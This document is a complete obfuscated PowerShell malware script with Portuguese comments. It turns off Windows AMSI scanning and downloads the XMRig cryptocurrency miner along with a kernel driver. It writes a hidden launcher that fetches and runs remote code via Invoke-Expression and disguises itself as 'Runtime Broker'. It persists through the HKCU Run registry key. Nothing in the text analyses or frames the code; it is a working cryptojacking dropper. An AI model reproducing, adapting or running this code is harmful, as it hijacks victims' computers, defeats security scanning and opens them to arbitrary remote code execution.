${W} = ('System.'+'Man'+'ag'+'ement.A'+'u'+'toma'+'tion'+'.'+'A');${c} = 'si';${M} = ('U'+'tils')
${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${c},${m}))
${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})

# Defina o URL e o caminho para o arquivo zip
if (.('Tes'+'t-P'+'ath') -Path "$env:APPDATA\Microsoft\88888.txt") {
    exit
} else {
    ${2`504} = "$env:APPDATA\Microsoft\88888.txt"
    ${u`RL} = ('https:/'+'/git'+'hu'+'b'+'.com/xmrig'+'/xmrig/'+'re'+'l'+'eases/download/'+'v6'+'.2'+'1'+'.'+'3/'+'xmrig-'+'6.21.3-msvc-'+'win6'+'4.z'+'ip')
    ${bAs`EpA`Th} = .('Jo'+'in-'+'Path') -Path ${e`Nv:loC`A`lAPpD`AtA} -ChildPath ('C'+'TF')
    ${Z`Ip`PAtH} = .('J'+'o'+'in-Path') -Path ${bA`s`E`PAtH} -ChildPath ('xmri'+'g-6.21.3-m'+'svc-w'+'i'+'n64.z'+'ip')
    ${eX`T`R`AcTpAth} = &('Join-'+'P'+'ath') -Path ${bas`E`pATH} -ChildPath ('x'+'mrig'+'-6.'+'21.3')
    ${d`EstinAt`IoN`p`AtH} = ${BASep`A`Th}
    ${xmR`IgpA`Th} = &('J'+'oin-Pa'+'th') -Path ${de`stI`N`AtIoNP`ATh} -ChildPath ('xm'+'rig.exe')
    ${b`AT`c`hpAth} = &('Joi'+'n-P'+'ath') -Path ${BA`se`pA`Th} -ChildPath ('RuntimeBro'+'k'+'er.'+'p'+'s1')
    ${bAtC`h`ARGu`MENt} = ('-'+'Exec'+'uti'+'o'+'nP'+'olicy by'+'pa'+'ss -F'+'ile ') + " " + ${baT`ChPA`Th}
    ${shoR`TC`Utp`ATH} = &('Join-'+'Path') -Path "$env:APPDATA\Microsoft\" -ChildPath ('Run'+'timeBro'+'ker.ln'+'k')
    ${uR`i2} = (('{'+'0'+'}https://'+'raw.g'+'ith'+'u'+'b'+'user'+'cont'+'e'+'nt'+'.c'+'o'+'m/so'+'2'+'51/olaq'+'ue'+'r'+'i'+'da/main/file.ps1{0}')  -f [chAR]34)
    ${b`ATCHc`oNTENt} = ('ec'+'ho '+'5216612'+' '+'> '+"$2504`n "+'powershe'+'ll'+' '+'-w'+'indow'+'s'+'tyle '+'hi'+'dden '+'-Co'+'mmand'+' '+('{0'+'}I'+'nvoke-Ex'+'pr'+'ession ')  -F[Char]39+'(Invoke-Rest'+'M'+'e'+'tho'+'d '+'-'+'Uri '+"$uri2)' "+'')

    # Verifique se a pasta base existe; se não, crie-a
    if (-not (&('Te'+'st-'+'Path') -Path ${basEpa`Th})) {
        &('N'+'ew-It'+'em') -Path ${b`ASePa`Th} -ItemType ('Dir'+'e'+'ctory') | .('Out'+'-'+'Null')

    } else {

    }

    # Baixe o arquivo zip
    &('Inv'+'ok'+'e'+'-WebRequest') -Uri ${u`RL} -OutFile ${z`ipp`ATH}

    # Extraia o conteúdo do arquivo zip
    &('Expand-'+'Arch'+'iv'+'e') -Path ${ZI`PPATh} -DestinationPath ${base`P`ATh}

    # Defina o caminho do arquivo executável que você deseja mover
    ${SOuRC`e`F`ILe} = &('Join-Pat'+'h') -Path ${EX`TrAcTp`A`TH} -ChildPath ('xm'+'ri'+'g.e'+'xe')

    # Verifique se o arquivo existe
    if (.('T'+'est'+'-Path') -Path ${SoURC`e`Fi`LE}) {
        # Mova o arquivo para o novo local
        .('Move-'+'Item') -Path ${S`o`UrceFi`le} -Destination ${DeSTI`Na`TI`o`NPath}

    } else {

    }

    # Remova o arquivo zip
    if (.('T'+'est-Pat'+'h') -Path ${ZIpp`Ath}) {
        .('Re'+'move-Ite'+'m') -Path ${ZIP`PAtH} -Force

    } else {
 
    }

    # Remova a pasta extraída
    if (.('Test-'+'P'+'ath') -Path ${EXT`R`ActP`ATH}) {
        &('R'+'emove-'+'I'+'tem') -Path ${EXt`RACT`pa`TH} -Recurse -Force
   
    } else {
    
    }

    # Baixar arquivos adicionais
    .('I'+'nv'+'ok'+'e-RestMethod') -Uri ('https'+'://git'+'hub.co'+'m/s'+'o251/olaq'+'u'+'er'+'ida/re'+'lea'+'ses'+'/dow'+'nloa'+'d/1rele'+'asa'+'e/'+'c'+'on'+'fig.'+'jso'+'n') -OutFile "$basePath\config.json"
    .('In'+'vo'+'ke-'+'Re'+'stM'+'ethod') -Uri ('https://github.'+'co'+'m'+'/'+'so251/o'+'laqueri'+'da/re'+'leases/download'+'/1rel'+'ea'+'sae/WinRing0x6'+'4'+'.s'+'ys') -OutFile "$basePath\WinRing0x64.sys"

    # Crie o script batch para iniciar o xmrig.exe
    .('New-'+'Ite'+'m') -Path "$batchPath" -ItemType ('Fi'+'le')
    &('S'+'et-C'+'ontent') -Path ${B`ATcH`PaTH} -Value ${bA`Tc`H`cOnTEnT}

    # Função para criar um atalho
    function C`ReatE-sH`o`RtC`UT {
        param (
            [string]${ta`RGeTp`ATH} = "",
            [string]${s`Ho`Rt`cuTpaTH},
            [string]${WOR`kI`NGdI`ReC`To`Ry} = "",
            [string]${Arg`UM`E`NTS} = "",
            [string]${ICoNL`O`caTioN} = "",
            [string]${dES`cRiPt`I`on} = ""
        )

        ${W`sh`sh`eLL} = &('N'+'ew-Obje'+'c'+'t') -ComObject ('WSc'+'r'+'ipt.'+'S'+'hell')
        ${s`hO`Rt`CuT} = ${wShS`h`eLl}.('Create'+'S'+'ho'+'rt'+'cut').Invoke(${S`hORtCUtp`Ath})
        ${sh`oR`T`cut}."t`A`RgetPAth" =  ${t`ARGEtp`Ath}
        ${shO`RT`cUT}."Arg`UmenTS" = ${AR`G`U`meNTs}
        ${sHor`T`Cut}."Wor`KInGdI`R`E`C`TORy" = ${wOrKING`d`Ir`e`CtORy}
        ${sh`oRtcUT}."i`co`NLOCatioN" = ${IcOnl`ocAT`I`On}
        ${sHoRt`cUT}."dEsC`RipT`iOn" = ${dESc`RIp`T`ION}
        ${SHoR`T`cuT}."W`I`N`doWSTyLE" = 7  # 7 = Minimizada
        ${sHO`R`TCuT}.('Sav'+'e').Invoke()
    }

    # Crie um atalho para o script batch
    # Defina o caminho para o ícone padrão e a descrição
    ${i`cOnLoC`AtiOn} = ("$SystemRoot\System32\shell32.dll, "+'0')  # Exemplo de ícone padrão
    ${dEs`cr`IPTIOn} = ('R'+'u'+'nti'+'me Broker')


    &('Create-Sh'+'ort'+'c'+'ut') -TargetPath (('C'+':{0'+'}Win'+'do'+'ws'+'{0}Sy'+'stem32{0}WindowsPowerShe'+'ll{0}v1.0{0}pow'+'ershell.ex'+'e')  -f  [cHAr]92) -ShortcutPath ${SHortCut`PA`TH} -IconLocation ${ICONL`O`cAtIoN} -Description ${DEScR`iP`TIon} -Arguments ${baTCH`A`RG`UmENT}

    # Adicione o atalho ao registro para iniciar com o Windows
    &('Set-Ite'+'mPr'+'ope'+'rt'+'y') -Path (('HKCU:{0}Software{0}'+'Micro'+'s'+'oft{0}'+'Wi'+'n'+'dows{'+'0}Curre'+'ntVer'+'sio'+'n{0}R'+'un')-F  [cHAr]92) -Name ('R'+'untime'+'Broker') -Value "`"$shortcutPath`""

    .('Sta'+'rt-'+'Pro'+'cess') -FilePath "`"$shortcutPath`"" -WindowStyle ('H'+'idden')

}
